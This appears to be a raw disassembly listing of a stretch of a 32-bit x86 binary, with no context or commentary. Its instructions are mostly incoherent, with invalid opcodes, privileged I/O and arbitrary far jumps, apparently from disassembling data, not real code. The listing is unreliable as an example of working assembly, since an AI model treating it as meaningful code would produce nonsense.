  409f3c:	mov    DWORD PTR [ebx+edi*8-0x1f],ebp
  409f40:	push   esp
  409f41:	out    dx,al
  409f42:	adc    eax,0x3aeb4e0
  409f47:	sub    bh,BYTE PTR [edi]
  409f49:	fidivr DWORD PTR [ebx+0x51cd3fa2]
  409f4f:	fidiv  WORD PTR [esi]
  409f51:	sub    al,0x88
  409f53:	outs   dx,DWORD PTR ds:[esi]
  409f54:	(bad)  [edi-0x2e1423ba]
  409f5a:	mov    al,ss:0x80a02962
  409f60:	test   al,0x49
  409f62:	push   ebx
  409f63:	mov    esp,0x33e5a860
  409f68:	(bad)
  409f6b:	in     eax,0x2f
  409f6d:	cli    
  409f6e:	fld    QWORD PTR [edx]
  409f70:	jne    0x409f9e
  409f72:	pop    esi
  409f73:	push   es
  409f74:	pop    esp
  409f75:	fadd   DWORD PTR [ecx]
  409f77:	scas   eax,DWORD PTR es:[edi]
  409f78:	jp     0x409f9c
  409f7a:	call   FWORD PTR [edi+eax*4]
  409f7d:	and    ebx,DWORD PTR [eax+0x4f72cbb1]
  409f83:	sbb    DWORD PTR [edi-0x2f],ebx
  409f86:	and    al,0x42
  409f88:	(bad)  
  409f8a:	sub    BYTE PTR ds:0x8311dae1,bh
  409f90:	xchg   ebp,edi
  409f92:	call   0xea9c:0xa19dbf96
  409f99:	xchg   ebp,eax
  409f9a:	outs   dx,DWORD PTR ds:[esi]
  409f9b:	or     eax,0x59398d22
  409fa0:	call   0xc57:0xc13a0ce7
  409fa7:	fisttp WORD PTR [esi*4-0x7ab42a66]
  409fae:	out    dx,eax
  409faf:	adc    esi,ecx
  409fb1:	push   edi
  409fb2:	mov    ch,0xde
  409fb4:	hlt    
  409fb5:	outs   dx,DWORD PTR ds:[esi]
  409fb6:	in     eax,0xbf
  409fb8:	test   BYTE PTR [eax-0x3b8de586],cl
  409fbe:	push   edx
  409fbf:	xor    BYTE PTR [ebx],ch
  409fc1:	xor    BYTE PTR [edi+0x16],0x66
  409fc5:	mov    al,ds:0xf205dec4
  409fca:	popf   
  409fcb:	or     edx,esp
  409fcd:	adc    DWORD PTR ds:0x7953d01b,esi
  409fd3:	xchg   esi,eax
  409fd4:	outs   dx,DWORD PTR ds:[esi]
  409fd5:	imul   ecx,DWORD PTR [ebx-0xa],0x370220b1
  409fdc:	aad    0x1e
  409fde:	dec    esp
  409fdf:	cmp    BYTE PTR [ecx+0x10],0x32
  409fe3:	mov    bl,0x8
  409fe5:	in     al,dx
  409fe6:	or     BYTE PTR [eax+0x7b],bh
  409fe9:	lds    edx,FWORD PTR [ebx-0x2cf09c7c]
  409fef:	pop    esi
  409ff0:	test   eax,0x914e9fc0
  409ff5:	jo     0x409fdc
  409ff7:	je     0x409fa3
  409ff9:	lea    esi,[edx+0x648cb122]
  409fff:	mov    ds:0xfec595b7,eax
  40a004:	jmp    0x6e8b6fff
  40a009:	lea    ebp,[ebx-0x5e]
  40a00c:	dec    esp
  40a00d:	dec    edi
  40a00e:	mov    eax,ds:0x3656723e
  40a013:	xlat   BYTE PTR ds:[ebx]
  40a014:	push   edx
  40a015:	call   0xd39d:0x82315dba
  40a01c:	adc    DWORD PTR [eax-0x4286892e],eax
  40a022:	and    eax,0x1c0e5f8b
  40a027:	jnp    0x40a078
  40a029:	imul   DWORD PTR es:[ebx+0x5b6e499a]
  40a030:	(bad)  
  40a031:	das    
  40a032:	in     al,dx
  40a033:	adc    ebx,DWORD PTR [edi-0x64b443fb]
  40a039:	push   edi
  40a03a:	stos   DWORD PTR es:[edi],eax
  40a03b:	xchg   ebx,eax
  40a03c:	popf   
  40a03d:	lods   al,BYTE PTR ds:[esi]
  40a03e:	cmp    dl,bl
  40a040:	cmp    edx,DWORD PTR [ebp+ecx*4+0x8]
  40a044:	daa    
  40a045:	js     0x40a0b1
  40a047:	pushf  
  40a048:	retf   0xa19a
  40a04b:	rcr    DWORD PTR [ecx+0x115c91fb],0xdf
  40a052:	or     al,0x69
  40a054:	imul   eax,DWORD PTR ds:0x6dc1bfd2,0xfe343454
  40a05e:	inc    edx
  40a05f:	sbb    dh,BYTE PTR [ebx-0x1b]
  40a062:	(bad)  
  40a063:	cmc    
  40a064:	dec    esp
  40a065:	lods   eax,DWORD PTR ds:[esi]
  40a066:	mov    ah,0x55
  40a068:	(bad)  
  40a069:	stc    
  40a06a:	fcmove st,st(4)
  40a06c:	mov    cl,0xb
  40a06e:	dec    edi
  40a06f:	fdivr  DWORD PTR [esi]
  40a071:	(bad)  [eax+0x67]
  40a074:	push   esi
  40a075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a076:	xchg   esp,eax
  40a077:	int    0x48
  40a079:	shr    BYTE PTR [ebx+0x4cd3b55],cl
  40a07f:	push   cs
  40a080:	fild   WORD PTR ds:0x35184e0a
  40a086:	fimul  WORD PTR [ebx+edi*1+0x4915f3e8]
  40a08d:	push   esi
  40a08e:	icebp  
  40a08f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a090:	rol    al,cl
  40a092:	imul   esp,DWORD PTR [ecx],0x33
  40a095:	clc    
  40a096:	leave  
  40a097:	sar    BYTE PTR [eax+ebp*8+0x32],cl
  40a09b:	or     DWORD PTR [edi-0x38],0xb66c5510
  40a0a2:	retf   
  40a0a3:	(bad)  
  40a0a4:	icebp  
  40a0a5:	lods   al,BYTE PTR ds:[esi]
  40a0a6:	fs mov ebp,0xa309a9dc
  40a0ac:	mov    al,0x71
  40a0ae:	sbb    cl,BYTE PTR [esi-0x2c]
  40a0b1:	bound  esp,QWORD PTR [esi+0xc]
  40a0b4:	add    ecx,ebp
  40a0b6:	aas    
  40a0b7:	sbb    eax,0xed466ff6
  40a0bc:	add    DWORD PTR [eax],eax
  40a0be:	aad    0x30
  40a0c0:	retf   0x8e33
  40a0c3:	xor    DWORD PTR [ebp-0x70],eax
  40a0c6:	pop    esi
  40a0c7:	sti    
  40a0c8:	arpl   WORD PTR ds:0xf16c86fd,bx
  40a0ce:	jbe    0x40a115
  40a0d0:	mov    DWORD PTR [ecx-0x676979d5],ebp
  40a0d6:	sar    cl,0x60
  40a0d9:	stos   DWORD PTR es:[edi],eax
  40a0da:	push   ds
  40a0db:	adc    edx,DWORD PTR [edx-0x7f]
  40a0de:	imul   esi,esp,0x8b2e6d26
  40a0e4:	push   eax
  40a0e5:	xchg   BYTE PTR [edi-0x282afbb7],ah
  40a0eb:	ret    0xe516
  40a0ee:	lods   eax,DWORD PTR ds:[esi]
  40a0ef:	jmp    0x40a0b9
  40a0f1:	mov    ds:0xd4b1f929,al
  40a0f6:	scas   al,BYTE PTR es:[edi]
  40a0f7:	int3   
  40a0f8:	and    eax,0xf2347d8e
  40a0fd:	(bad)  
  40a0fe:	jg     0x40a173
  40a100:	inc    ebx
  40a101:	mov    WORD PTR [ecx+0x417f832b],?
  40a107:	mov    WORD PTR [eax],?
  40a109:	jae    0x6d554542
  40a10f:	pop    eax
  40a110:	test   eax,0x113f031d
  40a115:	in     al,dx
  40a116:	fcmovnb st,st(4)
  40a118:	dec    esi
  40a119:	xor    al,BYTE PTR [eax+0x16]
  40a11c:	xor    ecx,DWORD PTR [esi-0x5d989fce]
  40a122:	push   ebp
  40a123:	mov    dl,0x77
  40a125:	dec    eax
  40a126:	imul   esi,DWORD PTR [esi-0x5e],0x6905f547
  40a12d:	mov    BYTE PTR [ebx],al
  40a12f:	cwde   
  40a130:	mov    ebp,0xc27e8969
  40a135:	stc    
  40a136:	mov    ds:0x36745055,al
  40a13b:	cwde   
  40a13c:	pusha  
  40a13d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a13e:	repz out dx,eax
  40a140:	jae    0x40a0d7
  40a142:	mov    ecx,0xb812a90f
  40a147:	out    dx,al
  40a148:	jg     0x40a100
  40a14a:	adc    dh,BYTE PTR [ebx+0x11]
  40a14d:	inc    esp
  40a14e:	and    DWORD PTR [ebp+ecx*4-0x20],0x18
  40a153:	mov    ds,WORD PTR [ebp+0x7c]
  40a156:	xchg   ecx,eax
  40a157:	mov    BYTE PTR [edx-0x1265000f],bl
  40a15d:	pop    ecx
  40a15e:	fmul   DWORD PTR [ebp-0x59]
  40a161:	jae    0x40a175
  40a163:	dec    eax
  40a164:	mov    al,0x8d
  40a166:	(bad)
  40a16a:	pop    ecx
  40a16b:	sbb    edi,DWORD PTR [ebx]
  40a16d:	sbb    al,0xf0
  40a16f:	into   
  40a170:	(bad)  
  40a171:	icebp  
  40a172:	es lahf 
  40a174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a175:	inc    edi
  40a176:	test   al,0x7f
  40a178:	jbe    0x40a154
  40a17a:	outs   dx,DWORD PTR ds:[esi]
  40a17b:	jmp    0x40a1f4
  40a17d:	adc    ch,BYTE PTR [ecx]
  40a17f:	pop    ecx
  40a180:	cmp    BYTE PTR ds:0x2b1f8db6,bh
  40a186:	(bad)  
  40a187:	mov    cl,0x3b
  40a189:	loop   0x40a1b0
  40a18b:	sahf   
  40a18c:	fcomip st,st(0)
  40a18e:	cmp    esp,DWORD PTR [edi]
  40a190:	push   es
  40a191:	seto   BYTE PTR ds:0xda9b1bfc
  40a198:	enter  0xcde0,0xcc
  40a19c:	fdiv   st(0),st
  40a19e:	add    dl,BYTE PTR [ecx+0x6863c784]
  40a1a4:	fbstp  TBYTE PTR [ecx]
  40a1a6:	daa    
  40a1a7:	jp     0x40a1f1
  40a1a9:	imul   edx,DWORD PTR [ebx+0x48ba1138],0xffffff98
  40a1b0:	scas   al,BYTE PTR es:[edi]
  40a1b1:	jp     0x40a13d
  40a1b3:	out    0x3e,al
  40a1b5:	jmp    0xed42:0xd03784c8
  40a1bc:	sub    ah,BYTE PTR ds:0xc7e874d2
  40a1c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1c3:	cwde   
  40a1c4:	pop    eax
  40a1c5:	xchg   ebp,eax
  40a1c6:	dec    eax
  40a1c7:	ds daa 
  40a1c9:	repnz iret 
  40a1cb:	rol    DWORD PTR [esi+0x185aa421],0x9d
  40a1d2:	out    0x5f,eax
  40a1d4:	fwait
  40a1d5:	call   0x9190a90a
  40a1da:	xor    BYTE PTR ds:0xff34f9b3,dh
  40a1e0:	mov    eax,0x2866bdec
  40a1e5:	inc    ecx
  40a1e6:	inc    eax
  40a1e7:	call   0x85ffae00
  40a1ec:	xchg   ebp,eax
  40a1ed:	jmp    0x2343:0x675fcaf9
  40a1f4:	pop    es
  40a1f5:	enter  0x93f5,0xed
  40a1f9:	inc    esp
  40a1fa:	les    esp,FWORD PTR [ebx]
  40a1fc:	jg     0x40a21a
  40a1fe:	(bad)  
  40a1ff:	cwde   
  40a200:	in     eax,dx
  40a201:	and    eax,0x6398919a
  40a206:	sbb    DWORD PTR [edx-0x31],0x7
  40a20a:	js     0x40a1d6
  40a20c:	mov    esp,0x7e0b59fd
  40a211:	push   0xffffffd9
  40a213:	dec    edx
  40a214:	jl     0x40a215
  40a216:	or     ch,BYTE PTR [esi-0x3b]
  40a219:	aam    0xe6
  40a21b:	ins    BYTE PTR es:[edi],dx
  40a21c:	jmp    0x40a27b
  40a21e:	cld    
  40a21f:	xchg   dh,ah
  40a221:	add    DWORD PTR [edx-0x6d],eax
  40a224:	fisttp WORD PTR [esi+0x3b]
  40a227:	sub    DWORD PTR [edx-0x16acc850],eax
  40a22d:	mov    ebx,0xd4f2f65c
  40a232:	sbb    BYTE PTR ss:[eax],0x61
  40a236:	mov    eax,0xfafd574f
  40a23b:	jno    0x40a26c
  40a23d:	dec    esp
  40a23e:	fs cli 
  40a240:	jp     0x40a286
  40a242:	jb     0x40a287
  40a244:	mov    ebp,0xf438a76d
  40a249:	test   eax,0x86ace474
  40a24e:	shl    DWORD PTR [edi-0x5a],0x8f
  40a252:	(bad)  
  40a253:	jo     0x40a1fb
  40a255:	xlat   BYTE PTR ds:[ebx]
  40a256:	test   al,0x70
  40a258:	mov    al,ds:0xc42a7412
  40a25d:	xchg   edx,eax
  40a25e:	popa   
  40a25f:	jae    0x40a25a
  40a261:	cs cmp ch,BYTE PTR gs:[eax-0x17]
  40a266:	sub    DWORD PTR [edi+0x7a],edx
  40a269:	or     eax,0xea8b7fab
  40a26e:	push   0xffffffb8
  40a270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a271:	das    
  40a272:	inc    eax
  40a273:	cmp    eax,0x2c0b69f6
  40a278:	mov    cl,0x6d
  40a27a:	out    0x30,al
  40a27c:	aaa    
  40a27d:	adc    eax,0xbb274f8e
  40a282:	xchg   esi,esi
  40a284:	shl    BYTE PTR [ebx],0x19
  40a287:	lds    edx,FWORD PTR [ebp+0xd]
  40a28a:	fbstp  TBYTE PTR [ebx]
  40a28c:	jne    0x40a221
  40a28e:	lds    ecx,FWORD PTR [eax-0x57d8c587]
  40a294:	dec    edi
  40a295:	xchg   BYTE PTR [ebx],bl
  40a297:	dec    eax
  40a298:	cmp    eax,0xa4e678e8
  40a29d:	or     eax,DWORD PTR [ebx+eiz*1]
  40a2a0:	cmc    
  40a2a1:	and    cl,ch
  40a2a3:	mov    edi,ebp
  40a2a5:	cmp    eax,0x1f29deff
  40a2aa:	mov    esp,0xee391da0
  40a2af:	jb     0x40a31b
  40a2b1:	sub    al,0xaf
  40a2b3:	cs xor al,0x85
  40a2b6:	ins    DWORD PTR es:[edi],dx
  40a2b7:	scas   eax,DWORD PTR es:[edi]
  40a2b8:	jno    0x40a2b5
  40a2ba:	mov    BYTE PTR [ecx+0x284a8c5d],ch
  40a2c0:	mov    bh,0xdf
  40a2c2:	cwde   
  40a2c3:	arpl   bx,si
  40a2c5:	and    BYTE PTR [esi-0x2a7c9ba7],al
  40a2cb:	jle    0x40a289
  40a2cd:	pop    esp
  40a2ce:	fbstp  TBYTE PTR [esi-0xbc19a77]
  40a2d4:	push   ss
  40a2d5:	cs ret 0xc44a
  40a2d9:	cmp    DWORD PTR [ebp-0x13],esi
  40a2dc:	stos   DWORD PTR es:[edi],eax
  40a2dd:	lahf   
  40a2de:	cli    
  40a2df:	fmul   st,st(4)
  40a2e1:	mov    bl,0xe2
  40a2e3:	dec    edx
  40a2e4:	sbb    edx,ebp
  40a2e6:	or     ecx,DWORD PTR [eax+0x1c]
  40a2e9:	int    0xc5
  40a2eb:	or     edi,DWORD PTR [edi-0x18]
  40a2ee:	lods   eax,DWORD PTR ds:[esi]
  40a2ef:	mov    esi,0x3559db10
  40a2f4:	mov    ds:0x3c557d88,al
  40a2f9:	add    eax,0x6be520f9
  40a2fe:	sub    edx,DWORD PTR [esi]
  40a300:	shl    dl,cl
  40a302:	sbb    eax,0x60356957
  40a307:	push   ds
  40a308:	ins    BYTE PTR es:[edi],dx
  40a309:	xchg   ebp,eax
  40a30a:	mov    ds:0x796a4e39,al
  40a30f:	adc    BYTE PTR [ebp+0x64],cl
  40a312:	ins    BYTE PTR es:[edi],dx
  40a313:	lahf   
  40a314:	or     BYTE PTR fs:[eax],dh
  40a317:	pop    ebp
  40a318:	xor    edx,0xf37ed3f
  40a31e:	fs ds clc 
  40a321:	jg     0x40a300
  40a323:	mov    ?,WORD PTR [ebp+0x25]
  40a326:	mov    cl,0x4b
  40a328:	or     eax,0x853281a2
  40a32d:	adc    DWORD PTR [eax-0x3b],0xa139b5df
  40a334:	cmp    DWORD PTR [eax-0x2e],0xe9576101
  40a33b:	sub    DWORD PTR [ebx],0xeba4bd3a
  40a341:	xchg   DWORD PTR [edx],esp
  40a343:	cmp    al,0xa
  40a345:	repnz add eax,0x2b29e035
  40a34b:	lock add dl,BYTE PTR [ecx]
  40a34e:	add    BYTE PTR [ebx+0x14],0x3f
  40a352:	adc    eax,0x5ac74d4b
  40a357:	leave  
  40a358:	sub    dh,bl
  40a35a:	pop    edi
  40a35b:	cmp    al,0x1b
  40a35d:	mov    eax,0x6e1d9f73
  40a362:	arpl   WORD PTR [ecx+edx*4+0x79],bx
  40a366:	test   DWORD PTR [ebx+esi*2-0x2b2321ed],ebx
  40a36d:	(bad)  
  40a36e:	sbb    DWORD PTR [esi],esi
  40a370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a371:	pop    ecx
  40a372:	fnsave [edi+0x51f0670c]
  40a378:	sub    al,0x16
  40a37a:	mov    bh,0xc4
  40a37c:	inc    edi
  40a37d:	mov    dl,0xdf
  40a37f:	popf   
  40a380:	jne    0x40a354
  40a382:	cmc    
  40a383:	push   esp
  40a384:	cs inc edx
  40a386:	adc    eax,0xae8445ec
  40a38b:	jp     0x40a3f8
  40a38d:	fcmove st,st(7)
  40a38f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a390:	sub    BYTE PTR [ebx],ah
  40a392:	dec    ecx
  40a393:	data16 jg 0x40a351
  40a396:	stos   DWORD PTR es:[edi],eax
  40a397:	lea    edi,ds:0x8ae66c6a
  40a39d:	cmp    edi,DWORD PTR [edx]
  40a39f:	add    ah,BYTE PTR [ebx+0x29de088]
  40a3a5:	shr    BYTE PTR [esi+ebx*4+0x74],cl
  40a3a9:	pop    eax
  40a3aa:	int    0x3b
  40a3ac:	push   0x87f805c1
  40a3b1:	mov    edx,0xac2f4803
  40a3b6:	pop    ss
  40a3b7:	xor    esi,0x2a55aaf1
  40a3bd:	data16 jb 0x40a3ff
  40a3c0:	lahf   
  40a3c1:	fsubr  st(0),st
  40a3c3:	outs   dx,DWORD PTR ds:[esi]
  40a3c4:	int3   
  40a3c5:	push   cs
  40a3c6:	or     BYTE PTR [ecx-0x33c74fc2],dh
  40a3cc:	sbb    BYTE PTR [ebx-0xd],bl
  40a3cf:	inc    ebp
  40a3d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3d1:	mov    cl,0x8d
  40a3d3:	pop    ss
  40a3d4:	(bad)  
  40a3d5:	repz out dx,al
  40a3d7:	or     dh,BYTE PTR [ebx]
  40a3d9:	sbb    BYTE PTR [ecx+eiz*2-0x3f9a2b73],dh
  40a3e0:	je     0x40a3f0
  40a3e2:	mov    cl,BYTE PTR [eax-0x71]
  40a3e5:	push   es
  40a3e6:	ror    DWORD PTR [ecx-0x4dacbb0b],0x1c
  40a3ed:	cdq    
  40a3ee:	ficom  DWORD PTR [ebx+0x331cdcee]
  40a3f4:	jns    0x40a3f1
  40a3f6:	sar    BYTE PTR [esi*8-0x7c593bb],cl
  40a3fd:	popa   
  40a3fe:	sahf   
  40a3ff:	sub    eax,0x2f7c6660
  40a404:	mov    dh,BYTE PTR [ecx-0x38]
  40a407:	pop    ebx
  40a408:	out    dx,eax
  40a409:	ret    0x7a3
  40a40c:	mov    eax,0xf6e49f54
  40a411:	pop    ebx
  40a412:	cmp    BYTE PTR [ebx-0x11],0x25
  40a416:	ret    
  40a417:	rcl    DWORD PTR [edi+0x1d],1
  40a41a:	add    al,0x7d
  40a41c:	pop    ebp
  40a41d:	mov    cl,0x3a
  40a41f:	(bad)  
  40a421:	mov    cl,0xa0
  40a423:	jnp    0x40a435
  40a425:	daa    
  40a426:	dec    ecx
  40a427:	xor    DWORD PTR [ebp+edi*2-0x369e266f],0xffffffc1
  40a42f:	or     ch,ah
  40a431:	mov    ebx,0xd7d7d632
  40a436:	cmp    al,0x5
  40a438:	test   al,0xf3
  40a43a:	mov    dl,0x20
  40a43c:	mov    ah,0xa3
  40a43e:	loope  0x40a4aa
  40a440:	push   ebx
  40a441:	mov    dl,BYTE PTR [edi]
  40a443:	xchg   BYTE PTR [esi+0x49a48786],bl
  40a449:	aam    0xf3
  40a44b:	loop   0x40a4a2
  40a44d:	cwde   
  40a44e:	jbe    0x40a43a
  40a450:	fstp   TBYTE PTR [edi+0x7d]
  40a453:	push   ebx
  40a454:	jo     0x40a3fa
  40a456:	sub    eax,0x2edf4a99
  40a45b:	mov    al,0xaf
  40a45d:	test   DWORD PTR [edx+0x4ba91ee6],esp
  40a463:	mov    al,ds:0xadde0629
  40a468:	out    dx,eax
  40a469:	push   edi
  40a46a:	(bad)  ds:0x66992607
  40a470:	dec    esp
  40a471:	lods   eax,DWORD PTR ds:[esi]
  40a472:	inc    edx
  40a473:	jp     0x40a435
  40a475:	adc    BYTE PTR [esp+eiz*2],0x36
  40a479:	dec    ebx
  40a47a:	es cs ret 
  40a47d:	jge    0x40a479
  40a47f:	clc    
  40a480:	push   edi
  40a481:	mov    bl,0xcf
  40a483:	jecxz  0x40a4aa
  40a485:	mov    esi,0x953b1251
  40a48a:	xchg   ebx,eax
  40a48b:	mov    esp,0x5b9f13f0
  40a490:	cmp    ebx,DWORD PTR [ebx+0x4d85750a]
  40a496:	pop    es
  40a497:	cmp    BYTE PTR [edi+0x4fee9fdd],0xfe
  40a49e:	mov    esp,edx
  40a4a0:	iret   
  40a4a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4a2:	es dec ebx
  40a4a4:	mov    eax,ds:0x448ff47c
  40a4a9:	fstp   DWORD PTR [edi]
  40a4ab:	mov    esp,0x7b317320
  40a4b0:	pop    ecx
  40a4b1:	mov    edx,ebp
  40a4b3:	jmp    0xcc4f1086
  40a4b8:	addr16 cmp bl,0x51
  40a4bc:	ins    BYTE PTR es:[edi],dx
  40a4bd:	inc    esi
  40a4be:	lods   eax,DWORD PTR ds:[esi]
  40a4bf:	adc    eax,0x355ce5b2
  40a4c4:	out    dx,al
  40a4c5:	or     eax,esi
  40a4c7:	xchg   ebx,eax
  40a4c8:	fs jmp 0x3a84438d
  40a4ce:	pop    edx
  40a4cf:	cmp    esi,DWORD PTR ds:0xe61be3cd
  40a4d5:	pusha  
  40a4d6:	push   eax
  40a4d7:	jmp    0x40a4bc
  40a4d9:	cmp    al,0x62
  40a4db:	mov    esi,0x7e472a84
  40a4e0:	iret   
  40a4e1:	lea    ebx,[edi+ebx*1+0x13b30b20]
  40a4e8:	test   DWORD PTR [ecx-0x15],ebx
  40a4eb:	sbb    bh,dh
  40a4ed:	adc    ebp,DWORD PTR [edi+0x73efd7ba]
  40a4f3:	pop    edx
  40a4f4:	sbb    esp,eax
  40a4f6:	repnz pop ecx
  40a4f8:	mov    esi,0xa854c00f
  40a4fd:	js     0x40a4b0
  40a4ff:	mov    edx,0x40cd0e17
  40a504:	adc    dh,dh
  40a506:	popa   
  40a507:	jp     0x40a542
  40a509:	arpl   WORD PTR [edx+0x26],dx
  40a50c:	mov    ah,0x3d
  40a50e:	mov    edi,0x86d1c6c1
  40a513:	push   edi
  40a514:	movzx  edi,WORD PTR [edx-0x70d7d5fb]
  40a51b:	aas    
  40a51c:	sbb    DWORD PTR ds:0x5852f044,eax
  40a522:	cmp    BYTE PTR [esi-0x14],cl
  40a525:	dec    ebp
  40a526:	push   esp
  40a527:	dec    ebx
  40a528:	(bad)  
  40a529:	addr16 sti 
  40a52b:	fnstsw WORD PTR [ecx-0x505eb0fb]
  40a531:	mov    ds:0x9e198753,al
  40a536:	and    DWORD PTR [edx-0x7321ce8a],edi
  40a53c:	xor    al,0x9a
  40a53e:	pop    ecx
  40a53f:	sbb    esi,DWORD PTR [ebp-0x74ce4265]
  40a545:	push   ebx
  40a546:	xor    eax,0xf3db23c9
  40a54b:	adc    BYTE PTR [ebx-0x190567ea],al
  40a551:	adc    ebx,ebp
  40a553:	std    
  40a554:	sub    eax,0x456d922e
  40a559:	push   ds
  40a55a:	imul   eax,DWORD PTR [ecx+0x26c594de],0xfffffffc
  40a561:	mov    esi,0x51a4ac52
  40a566:	sub    eax,0xe1067423
  40a56b:	xor    dl,BYTE PTR [ecx+0x704744ef]
  40a571:	mov    ch,0xfc
  40a573:	sub    ebx,DWORD PTR [edi]
  40a575:	add    DWORD PTR [edi+0x72],ebx
  40a578:	dec    DWORD PTR [ecx-0x50a5bca1]
  40a57e:	sub    DWORD PTR [edx-0x339a8896],eax
  40a584:	xchg   BYTE PTR [edi],ch
  40a586:	sub    BYTE PTR ds:0x4e372e05,dl
  40a58c:	mov    bh,0x8f
  40a58e:	mov    dh,0x4e
  40a590:	ins    DWORD PTR es:[edi],dx
  40a591:	inc    esi
  40a592:	dec    ebx
  40a593:	jo     0x40a5b9
  40a595:	sbb    esp,edx
  40a597:	xlat   BYTE PTR ds:[ebx]
  40a598:	outs   dx,DWORD PTR ds:[esi]
  40a599:	out    0x37,al
  40a59b:	imul   esp,ebx,0x92e28c7e
  40a5a1:	and    ecx,esp
  40a5a3:	fwait
  40a5a4:	add    DWORD PTR [esi+eiz*8+0x50],ecx
  40a5a8:	mov    ebx,edi
  40a5aa:	pusha  
  40a5ab:	shl    BYTE PTR [esi+0x4d224a37],0x9b
  40a5b2:	dec    esi
  40a5b3:	pop    esi
  40a5b4:	out    0x7c,eax
  40a5b6:	mov    dl,0xb7
  40a5b8:	cwde   
  40a5b9:	shr    BYTE PTR [esi],cl
  40a5bb:	popf   
  40a5bc:	test   BYTE PTR ds:0x5f1479b1,bh
  40a5c2:	std    
  40a5c3:	rcl    BYTE PTR [ebx],cl
  40a5c5:	into   
  40a5c6:	aaa    
  40a5c7:	sub    eax,0xc0766f74
  40a5cc:	dec    ecx
  40a5cd:	retf   
  40a5ce:	or     al,0x54
  40a5d0:	inc    ecx
  40a5d1:	aad    0xe0
  40a5d3:	push   cs
  40a5d4:	retf   
  40a5d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5d6:	jmp    0x28f0a0b1
  40a5db:	pop    es
  40a5dc:	or     al,BYTE PTR [ecx+0x30e47384]
  40a5e2:	das    
  40a5e3:	in     eax,0xa
  40a5e5:	sub    eax,0x2eb0337c
  40a5ea:	mov    bh,0x45
  40a5ec:	pushf  
  40a5ed:	adc    eax,esi
  40a5ef:	loop   0x40a604
  40a5f1:	fcomp  DWORD PTR ss:[ebx-0x3d87629c]
  40a5f8:	(bad)  
  40a5f9:	sbb    bh,BYTE PTR [ebx+0x7bfbd876]
  40a5ff:	mov    bh,BYTE PTR [esi+0x60335510]
  40a605:	mov    ch,0x79
  40a607:	mov    edx,0x7e5739be
  40a60c:	xchg   esp,eax
  40a60d:	icebp  
  40a60e:	lods   al,BYTE PTR ds:[esi]
  40a60f:	pop    edx
  40a610:	mov    ds:0x5f0fafc,eax
  40a615:	add    eax,0x630ad23b
  40a61a:	mov    ebx,esi
  40a61c:	xchg   esp,eax
  40a61d:	dec    edx
  40a61e:	(bad)  
  40a61f:	push   ss
  40a620:	jne    0x40a62c
  40a622:	jno    0x40a64c
  40a624:	nop
  40a625:	mov    ebp,0x335e1349
  40a62a:	fdiv   QWORD PTR [edx+0x578fd9c2]
  40a630:	js     0x40a5f3
  40a632:	mov    ebp,0xfd05b88a
  40a637:	imul   ecx,ebp,0x1d
  40a63a:	test   DWORD PTR [esi-0x39],esp
  40a63d:	cmp    al,0x3a
  40a63f:	or     al,0x47
  40a641:	sub    eax,0x21984cfc
  40a646:	jbe    0x40a5e0
  40a648:	fbstp  TBYTE PTR [ecx+eiz*2-0x46]
  40a64c:	mov    bl,0x6
  40a64e:	or     esp,DWORD PTR [eax+0x37641d83]
  40a654:	cwde   
  40a655:	pop    ecx
  40a656:	add    al,0x52
  40a658:	ret    
  40a659:	(bad)  
  40a65a:	mov    ds,ecx
  40a65c:	mov    cl,0x8d
  40a65e:	out    0x8a,al
  40a660:	push   ebp
  40a661:	jmp    0x9676b1ff
  40a666:	inc    ecx
  40a667:	test   DWORD PTR [eax-0x32cd982],0x6ed4eac0
  40a671:	mov    ah,0x5a
  40a673:	pushf  
  40a674:	sub    eax,0xd3f5439f
  40a679:	or     bl,BYTE PTR [edx-0x12]
  40a67c:	mov    esp,0xe1c13315
  40a681:	ss xchg esp,eax
  40a683:	and    eax,0xa7c89a1f
  40a688:	add    cl,BYTE PTR [eax]
  40a68a:	aas    
  40a68b:	adc    eax,0xa641b61f
  40a690:	cmp    dl,BYTE PTR [edi-0x4e]
  40a693:	jmp    0xba74:0x9f688c6
  40a69a:	mov    fs,WORD PTR [eax-0x32ec4a4e]
  40a6a0:	jle    0x40a70e
  40a6a2:	mov    esi,0xbc8f681e
  40a6a7:	ds pop ebp
  40a6a9:	inc    ecx
  40a6aa:	mov    eax,ds:0x9aeab624
  40a6af:	adc    ecx,DWORD PTR [ecx]
  40a6b1:	mov    ch,al
  40a6b3:	fistp  QWORD PTR [ecx]
  40a6b5:	mov    edx,0x6ec22f14
  40a6ba:	mov    ebx,edi
  40a6bc:	call   0x27ec:0xa8d73cf4
  40a6c3:	mov    dh,0xe3
  40a6c5:	fisttp WORD PTR [esi]
  40a6c7:	and    BYTE PTR [edx+0x78],ah
  40a6ca:	es mov cl,0x53
  40a6cd:	(bad)  
  40a6ce:	daa    
  40a6cf:	jae    0x40a65d
  40a6d1:	jb     0x40a69a
  40a6d3:	hlt    
  40a6d4:	mov    esi,0x290d960
  40a6d9:	inc    ebp
  40a6da:	adc    DWORD PTR [ebx-0x4b9b7e02],ebp
  40a6e0:	xor    eax,0xff04c94d
  40a6e5:	and    eax,0xeb2aab36
  40a6ea:	les    ecx,FWORD PTR [esi-0x5a71991]
  40a6f0:	mov    bl,0x4d
  40a6f2:	jl     0x40a705
  40a6f4:	or     esi,DWORD PTR [edx+0x7a]
  40a6f7:	out    dx,al
  40a6f8:	pushf  
  40a6f9:	loop   0x40a6e0
  40a6fb:	xor    al,0x53
  40a6fd:	ds or  al,0xa6
  40a700:	sahf   
  40a701:	cld    
  40a702:	scas   eax,DWORD PTR es:[edi]
  40a703:	icebp  
  40a704:	mov    edi,0x11fd621b
  40a709:	xor    esp,DWORD PTR [edx+esi*1+0x6c]
  40a70d:	pusha  
  40a70e:	add    bl,BYTE PTR [ebx]
  40a710:	aam    0x1e
  40a712:	fadd   DWORD PTR [ecx]
  40a714:	call   0xb45478d3
  40a719:	mov    ebx,0xc62d9075
